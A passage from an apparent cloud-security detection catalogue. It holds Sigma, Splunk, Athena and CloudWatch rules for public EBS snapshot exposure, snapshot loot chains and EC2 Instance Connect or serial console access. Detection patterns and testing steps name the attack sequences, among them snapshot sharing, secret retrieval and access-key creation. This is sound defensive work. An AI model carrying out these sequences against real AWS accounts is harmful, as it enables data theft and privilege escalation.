      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["ModifySnapshotAttribute"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.snapshotId", "requestParameters.sourceSnapshotId", "requestParameters.createVolumePermission", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "ModifySnapshotAttribute", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { snapshotId: "snap-xxx", createVolumePermission: { add: { groups: ["all"] } } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the full chain: CreateSnapshot → share/copy → CreateVolume → AttachVolume.", "Verify if workflow was authorized.", "Check for cross-account sharing."],
    testingSteps: ["Execute full loot chain: CreateSnapshot, ModifySnapshotAttribute, CopySnapshot, CreateVolume, AttachVolume.", "Run Splunk or Athena correlation query."],
  },

  // --- Public EBS Snapshot Loot ---
  {
    id: "det-084",
    title: "Snapshot Made Public",
    description: "Detects the owner-account action that causes public exposure. ModifySnapshotAttribute with createVolumePermission add Group=all is the key control point that creates the public-loot opportunity.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "Critical",
    tags: ["EC2", "EBS", "Snapshot", "Public Exposure"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate public AMI/snapshot sharing", "Approved collaboration"],
    rules: {
      sigma: `title: Snapshot Made Public
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: ModifySnapshotAttribute
  filter_group:
    requestParameters.groupNames|contains: 'all'
  filter_perm:
    requestParameters.createVolumePermission|contains: 'all'
  condition: selection and (filter_group or filter_perm)
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=ModifySnapshotAttribute
| where like(requestParameters.groupNames, "%all%") OR like(requestParameters.createVolumePermission.add.groups, "%all%") OR mvcount(mvfilter(requestParameters.createVolumePermission.add.groups="all"))>0
| table _time, userIdentity.arn, requestParameters.snapshotId, requestParameters.groupNames, requestParameters.createVolumePermission, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.snapshotId, requestParameters.groupNames, requestParameters.createVolumePermission, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'ModifySnapshotAttribute'
  AND (requestParameters.groupNames LIKE '%all%'
    OR JSON_EXTRACT_SCALAR(requestParameters.createVolumePermission, '$.add.groups') LIKE '%all%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.snapshotId, requestParameters.groupNames, requestParameters.createVolumePermission, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "ModifySnapshotAttribute"
| filter requestParameters.groupNames like /all/ or requestParameters.createVolumePermission like /all/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["ModifySnapshotAttribute"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.snapshotId", "requestParameters.groupNames", "requestParameters.createVolumePermission", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "ModifySnapshotAttribute", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { snapshotId: "snap-xxx", groupNames: ["all"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the snapshot and actor.", "Verify if public sharing was authorized.", "Consider reverting the permission."],
    testingSteps: ["Call ModifySnapshotAttribute with groupNames all.", "Verify detection triggers."],
  },
  {
    id: "det-085",
    title: "Public Snapshot Exposure Inventory / Hygiene",
    description: "Detection/hunt concept for existing public snapshots owned by the organization. Recurring inventory checks are required because already-public snapshots may not generate fresh control-plane events. Use DescribeSnapshotAttribute or inventory queries.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "High",
    tags: ["EC2", "EBS", "Snapshot", "Posture", "Hunting"],
    logSources: ["AWS CloudTrail", "EC2 API"],
    falsePositives: ["Intentionally public AMIs", "Approved public snapshots"],
    rules: {
      sigma: `title: Public Snapshot Inventory Hunt
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: DescribeSnapshotAttribute
  filter_attr:
    requestParameters.attribute|contains: 'createVolumePermission'
  condition: selection and filter_attr
level: high
# Use as scheduled hunt: query DescribeSnapshotAttribute for createVolumePermission,
# then check response for group=all or external account IDs.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=DescribeSnapshotAttribute requestParameters.attribute=createVolumePermission
| table _time, userIdentity.arn, requestParameters.snapshotId, responseElements
# Hunt: Run EC2 DescribeSnapshotAttribute for all snapshots, filter response for group=all or userIds`,
      cloudtrail: `-- Hunt: List snapshots then check createVolumePermission
-- Step 1: Get snapshot IDs from DescribeSnapshots (owner-ids self)
-- Step 2: For each snapshot, DescribeSnapshotAttribute(attribute=createVolumePermission)
-- Filter results where createVolumePermission contains group=all or non-self userIds
SELECT eventTime, userIdentity.arn, requestParameters.snapshotId, responseElements
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'DescribeSnapshotAttribute'
  AND requestParameters.attribute = 'createVolumePermission'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.snapshotId, responseElements
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "DescribeSnapshotAttribute"
| filter requestParameters.attribute = "createVolumePermission"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["DescribeSnapshotAttribute"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "requestParameters.snapshotId", "requestParameters.attribute", "responseElements", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "DescribeSnapshotAttribute", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { snapshotId: "snap-xxx", attribute: "createVolumePermission" }, responseElements: { createVolumePermission: { groups: ["all"] } }, eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Run inventory of snapshots with createVolumePermission.", "Identify any with group=all or external account IDs.", "Remediate unauthorized public exposure."],
    testingSteps: ["Run DescribeSnapshotAttribute for snapshots.", "Verify hunt logic identifies public snapshots."],
  },
  {
    id: "det-086",
    title: "CopySnapshot of Public or External Snapshot",
    description: "Detects suspicious copying of snapshots that are not local/private baseline snapshots. In the consumer/attacker account, CopySnapshot of external or unapproved-region source is a strong signal. Exclude expected DR/migration workflows.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "High",
    tags: ["EC2", "EBS", "Snapshot", "Consumer Account"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Expected DR", "Approved migration", "Cross-region backup"],
    rules: {
      sigma: `title: CopySnapshot of External or Public Snapshot
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: CopySnapshot
  filter_external:
    requestParameters.sourceRegion|exists: true
    requestParameters.sourceSnapshotId|exists: true
  condition: selection and filter_external
level: high
# Refine: exclude sourceRegion = local region and known DR account IDs.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=CopySnapshot
| where isnotnull(requestParameters.sourceRegion) AND isnotnull(requestParameters.sourceSnapshotId)
| eval source_region=requestParameters.sourceRegion
| table _time, userIdentity.arn, requestParameters.sourceSnapshotId, requestParameters.sourceRegion, requestParameters.destinationRegion, recipientAccountId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.sourceSnapshotId, requestParameters.sourceRegion, requestParameters.destinationRegion, recipientAccountId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'CopySnapshot'
  AND requestParameters.sourceSnapshotId IS NOT NULL
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.sourceSnapshotId, requestParameters.sourceRegion, requestParameters.destinationRegion, recipientAccountId, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "CopySnapshot"
| filter ispresent(requestParameters.sourceSnapshotId)
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["CopySnapshot"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.sourceSnapshotId", "requestParameters.sourceRegion", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "CopySnapshot", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::999999999999:user/attacker" }, requestParameters: { sourceSnapshotId: "snap-xxx", sourceRegion: "us-east-1", destinationRegion: "us-east-1" }, recipientAccountId: "999999999999", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify source snapshot and source region/account.", "Verify if copy was authorized.", "Check if source is public or external account."],
    testingSteps: ["Copy a snapshot from another region or account.", "Verify detection triggers."],
  },
  {
    id: "det-087",
    title: "Public Snapshot Loot Chain",
    description: "Detects copy + volume creation + attach sequence in the consumer account. CopySnapshot → CreateVolume from copied snapshot → AttachVolume. High-confidence public snapshot loot detection.",
    awsService: "EC2",
    relatedServices: ["EBS"],
    severity: "Critical",
    tags: ["EC2", "EBS", "Snapshot", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate DR restore", "Approved migration workflow"],
    rules: {
      sigma: `title: Public Snapshot Loot Chain
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_copy:
    eventSource: ec2.amazonaws.com
    eventName: CopySnapshot
  selection_volume:
    eventSource: ec2.amazonaws.com
    eventName:
      - CreateVolume
      - AttachVolume
  condition: 1 of selection_*
level: critical
# Full chain correlation requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=CopySnapshot OR eventName=CreateVolume OR eventName=AttachVolume)
| eval actor=userIdentity.arn
| eval is_copy=if(eventName="CopySnapshot", 1, 0)
| eval is_volume=if(eventName IN ("CreateVolume","AttachVolume"), 1, 0)
| transaction actor maxspan=2h
| where mvcount(mvfilter(is_copy=1))>0 AND mvcount(mvfilter(is_volume=1))>0
| table _time, actor, eventName, requestParameters.sourceSnapshotId, requestParameters.snapshotId`,
      cloudtrail: `WITH copy_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS copy_time, requestParameters.sourceSnapshotId AS source_snap
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName = 'CopySnapshot'
),
volume_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS vol_time, eventName
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName IN ('CreateVolume', 'AttachVolume')
)
SELECT c.actor, c.copy_time, v.vol_time, v.eventName
FROM copy_evt c
JOIN volume_evt v ON c.actor = v.actor
  AND v.vol_time > c.copy_time
  AND v.vol_time <= c.copy_time + INTERVAL '2' HOUR
ORDER BY c.copy_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.sourceSnapshotId, requestParameters.snapshotId
| filter eventSource = "ec2.amazonaws.com"
| filter eventName in ["CopySnapshot", "CreateVolume", "AttachVolume"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt >= 2
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2.amazonaws.com"], eventName: ["CopySnapshot", "CreateVolume", "AttachVolume"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.sourceSnapshotId", "requestParameters.snapshotId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "CopySnapshot", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::999999999999:user/attacker" }, requestParameters: { sourceSnapshotId: "snap-xxx", sourceRegion: "us-east-1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify CopySnapshot → CreateVolume → AttachVolume sequence.", "Verify if workflow was authorized.", "Check source snapshot ownership and public status."],
    testingSteps: ["Copy public snapshot, CreateVolume, AttachVolume.", "Run Splunk or Athena correlation query."],
  },

  // --- EC2 Instance Connect ---
  {
    id: "det-088",
    title: "EC2 Instance Connect Key Push",
    description: "Baseline visibility for use of EC2 Instance Connect. SendSSHPublicKey can be legitimate troubleshooting/admin behavior but should be tracked because it creates SSH access. The temporary key lasts about 60 seconds.",
    awsService: "EC2",
    relatedServices: [],
    severity: "Medium",
    tags: ["EC2", "Instance Connect", "Lateral Movement"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate admin troubleshooting", "Platform automation"],
    rules: {
      sigma: `title: EC2 Instance Connect Key Push
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSSHPublicKey
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSSHPublicKey
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.instanceId, sourceIPAddress, userAgent`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.instanceId, sourceIPAddress, userAgent
FROM cloudtrail_logs
WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
  AND eventName = 'SendSSHPublicKey'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.instanceId, sourceIPAddress
| filter eventSource = "ec2-instance-connect.amazonaws.com"
| filter eventName = "SendSSHPublicKey"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "userAgent", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and target instance.", "Verify if key push was authorized.", "Check sourceIPAddress and userAgent."],
    testingSteps: ["Call SendSSHPublicKey.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-089",
    title: "EC2 Instance Connect by Unexpected Actor",
    description: "Detects SendSSHPublicKey by identities that normally should not perform interactive host access. Suspicious actors include IAM users outside ops/platform roles, application roles, and unusual assumed roles.",
    awsService: "EC2",
    relatedServices: [],
    severity: "High",
    tags: ["EC2", "Instance Connect", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known ops/platform roles", "Helpdesk automation"],
    rules: {
      sigma: `title: EC2 Instance Connect by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSSHPublicKey
  filter_known:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
      - '/role/Ops'
      - '/role/DevOps'
      - '/user/admin'
    userIdentity.sessionContext.sessionIssuer.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
      - '/role/Ops'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSSHPublicKey
| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Ops%") OR like(userIdentity.arn, "%/role/DevOps%") OR like(userIdentity.arn, "%/user/admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Admin%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Platform%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%/role/Ops%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
  AND eventName = 'SendSSHPublicKey'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Ops%'
  AND userIdentity.arn NOT LIKE '%/role/DevOps%'
  AND userIdentity.arn NOT LIKE '%/user/admin%'
  AND (userIdentity.sessionContext.sessionIssuer.arn IS NULL OR (userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Admin%' AND userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Platform%' AND userIdentity.sessionContext.sessionIssuer.arn NOT LIKE '%/role/Ops%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, requestParameters.instanceId, sourceIPAddress
| filter eventSource = "ec2-instance-connect.amazonaws.com"
| filter eventName = "SendSSHPublicKey"
| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|Ops|DevOps)/ and userIdentity.arn not like /\\/user\\/admin/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSSHPublicKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for Instance Connect.", "Update allowlist if legitimate."],
    testingSteps: ["As a non-ops role, call SendSSHPublicKey.", "Verify detection triggers."],
  },
  {
    id: "det-090",
    title: "EC2 Instance Connect Key Push to Sensitive Target",
    description: "Detects key push to sensitive or unusual instances: privileged, production, domain, secrets, bastion, or other sensitive patterns.",
    awsService: "EC2",
    relatedServices: [],
    severity: "High",
    tags: ["EC2", "Instance Connect", "Sensitive Target"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized access to production instances", "Break-glass procedures"],
    rules: {
      sigma: `title: EC2 Instance Connect Key Push to Sensitive Target
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSSHPublicKey
  filter_target:
    requestParameters.instanceId|contains:
      - 'prod'
      - 'Prod'
      - 'production'
      - 'dc'
      - 'domain'
      - 'bastion'
      - 'secrets'
      - 'breakglass'
      - 'privileged'
  condition: selection and filter_target
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSSHPublicKey
| where like(requestParameters.instanceId, "%prod%") OR like(requestParameters.instanceId, "%Prod%") OR like(requestParameters.instanceId, "%production%") OR like(requestParameters.instanceId, "%dc%") OR like(requestParameters.instanceId, "%domain%") OR like(requestParameters.instanceId, "%bastion%") OR like(requestParameters.instanceId, "%secrets%") OR like(requestParameters.instanceId, "%breakglass%") OR like(requestParameters.instanceId, "%privileged%")
| table _time, userIdentity.arn, requestParameters.instanceId, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, requestParameters.instanceId, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
  AND eventName = 'SendSSHPublicKey'
  AND (requestParameters.instanceId LIKE '%prod%' OR requestParameters.instanceId LIKE '%Prod%' OR requestParameters.instanceId LIKE '%production%' OR requestParameters.instanceId LIKE '%dc%' OR requestParameters.instanceId LIKE '%domain%' OR requestParameters.instanceId LIKE '%bastion%' OR requestParameters.instanceId LIKE '%secrets%' OR requestParameters.instanceId LIKE '%breakglass%' OR requestParameters.instanceId LIKE '%privileged%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.instanceId, sourceIPAddress
| filter eventSource = "ec2-instance-connect.amazonaws.com"
| filter eventName = "SendSSHPublicKey"
| filter requestParameters.instanceId like /prod|dc|domain|bastion|secrets|breakglass|privileged/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-prod-db-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the target instance and its sensitivity.", "Verify if key push was authorized.", "Cross-reference with instance tags if available."],
    testingSteps: ["Push key to an instance with 'prod' in its identifier.", "Verify detection triggers."],
  },
  {
    id: "det-091",
    title: "EC2 Instance Connect Key Push Followed by Suspicious Activity",
    description: "High-confidence lateral movement: SendSSHPublicKey then shortly afterward same actor or target host context performs SSM StartSession, GetSecretValue, KMS Decrypt, S3 GetObject, IAM policy modification, or other sensitive API calls.",
    awsService: "EC2",
    relatedServices: ["SSM", "Secrets Manager", "KMS", "S3", "IAM"],
    severity: "Critical",
    tags: ["EC2", "Instance Connect", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate admin session followed by expected API use"],
    rules: {
      sigma: `title: EC2 Instance Connect Key Push Followed by Suspicious Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_push:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSSHPublicKey
  selection_sensitive:
    eventName:
      - StartSession
      - GetSecretValue
      - Decrypt
      - AssumeRole
      - CreateAccessKey
      - PutUserPolicy
      - AttachRolePolicy
      - PutRolePolicy
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ec2-instance-connect.amazonaws.com AND eventName=SendSSHPublicKey) OR (eventName=StartSession OR eventName=GetSecretValue OR eventName=Decrypt OR eventName=AssumeRole OR eventName=CreateAccessKey OR eventName=PutUserPolicy OR eventName=AttachRolePolicy OR eventName=PutRolePolicy))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_push=if(eventSource="ec2-instance-connect.amazonaws.com" AND eventName="SendSSHPublicKey", 1, 0)
| eval is_sensitive=if(eventName IN ("StartSession","GetSecretValue","Decrypt","AssumeRole","CreateAccessKey","PutUserPolicy","AttachRolePolicy","PutRolePolicy"), 1, 0)
| transaction actor maxspan=15m
| where mvcount(mvfilter(is_push=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.instanceId`,
      cloudtrail: `WITH push_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS push_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
    AND eventName = 'SendSSHPublicKey'
),
sensitive_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('StartSession', 'GetSecretValue', 'Decrypt', 'AssumeRole', 'CreateAccessKey', 'PutUserPolicy', 'AttachRolePolicy', 'PutRolePolicy')
)
SELECT e.actor, e.push_time, s.use_time, s.eventName
FROM push_evt e
JOIN sensitive_evt s ON e.actor = s.actor
  AND s.use_time > e.push_time
  AND s.use_time <= e.push_time + INTERVAL '15' MINUTE
ORDER BY e.push_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.instanceId
| filter (eventSource = "ec2-instance-connect.amazonaws.com" and eventName = "SendSSHPublicKey")
  or eventName in ["StartSession", "GetSecretValue", "Decrypt", "AssumeRole", "CreateAccessKey", "PutUserPolicy", "AttachRolePolicy", "PutRolePolicy"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2-instance-connect"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ec2-instance-connect.amazonaws.com"], eventName: ["SendSSHPublicKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2-instance-connect.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2-instance-connect.amazonaws.com", eventName: "SendSSHPublicKey", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { instanceId: "i-0abc123" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and SendSSHPublicKey time.", "Review sequence: key push → sensitive API within 15 min.", "Verify if follow-on activity was from the session."],
    testingSteps: ["Push key, then perform GetSecretValue or StartSession within 15 min.", "Run Splunk or Athena correlation query."],
  },

  // --- EC2 Serial Console Access ---
  {
    id: "det-092",
    title: "Serial Console SSH Public Key Sent",
    description: "Baseline visibility for serial console access attempts. Serial console is generally rarer and more sensitive than ordinary EC2 Instance Connect because it bypasses network controls and requires account-level enablement.",
    awsService: "EC2",
    relatedServices: [],
    severity: "High",
    tags: ["EC2", "Serial Console", "Lateral Movement"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate recovery operations", "Approved serial console access"],
    rules: {
      sigma: `title: Serial Console SSH Public Key Sent
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2-instance-connect.amazonaws.com
    eventName: SendSerialConsoleSSHPublicKey
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2-instance-connect.amazonaws.com eventName=SendSerialConsoleSSHPublicKey
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.instanceId, sourceIPAddress, userAgent`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.instanceId, sourceIPAddress, userAgent
FROM cloudtrail_logs
WHERE eventSource = 'ec2-instance-connect.amazonaws.com'
  AND eventName = 'SendSerialConsoleSSHPublicKey'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.instanceId, sourceIPAddress
| filter eventSource = "ec2-instance-connect.amazonaws.com"
| filter eventName = "SendSerialConsoleSSHPublicKey"
| sort @timestamp desc`,
